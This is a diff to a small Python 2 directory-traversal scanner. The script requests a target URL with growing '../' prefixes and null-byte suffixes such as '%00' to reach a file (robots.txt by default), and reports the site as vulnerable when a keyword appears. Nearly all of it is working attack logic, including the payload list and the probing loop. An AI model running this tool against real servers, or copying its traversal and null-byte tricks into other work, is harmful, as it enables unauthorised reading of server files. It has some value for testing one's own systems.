@@ -12,9 +12,7 @@ file = 'robots.txt'
 
 html = ''
 prefix = ''
-block = (
-		'%00'
-		)
+payload =['','%00','%01']
 url = ''
 keyword = 'User-agent'
 force = False
@@ -29,7 +27,6 @@ def usage():
 		print "	-n,--no-break	no break while the vuln finded"
 
 def testurl(url):
-		print "Testing: ",url
 		try:
 				response = urllib2.urlopen(url)
 				#print response.info()
@@ -47,7 +44,7 @@ try:
 		if len(sys.argv) < 2:
 				usage()
 				sys.exit()
-		opts,args = getopt.getopt(sys.argv[1:],"ht:d:f:k:n",["help","target=","depth=","file=","keyword=","no-break"])
+		opts,args = getopt.getopt(sys.argv[1:],"ht:d:f:k:bn",["help","target=","depth=","file=","keyword=","block-test","no-break"])
 		for opt, arg in opts:
 			if opt in("-h","--help"):
 				usage()
@@ -68,6 +65,8 @@ try:
 			if opt in("-k","--keyword"):
 				keyword = arg
 				#print keyword
+			if opt in("-b","--block-test"):
+				print "block-test"
 			if opt in("-n","--no-break"):
 				force = True
 except getopt.GetoptError:
@@ -75,17 +74,19 @@ except getopt.GetoptError:
 		sys.exit(2)
 
 
-for i in range(0,depth):
-		prefix += '../'
-		url = target + prefix + file
-		html = testurl(url)
-		if keyword in html:
-				print url, " is Vulnerable"
-				writefile(url)
-				if not force:
-					break
-				else:
+for i in range(0,depth+1):
+		for j in range(0,2):
+			url = target + prefix + file + payload[j]
+			print "Testing: ",url
+			html = testurl(url)
+			if keyword in html:
+					print url, " is Vulnerable"
+					writefile(url)
+					if not force:
+						sys.exit()
+					else:
+						continue
+			else:
+					time.sleep(2)
 					continue
-		else:
-				time.sleep(2)
-				continue
+		prefix += '../'
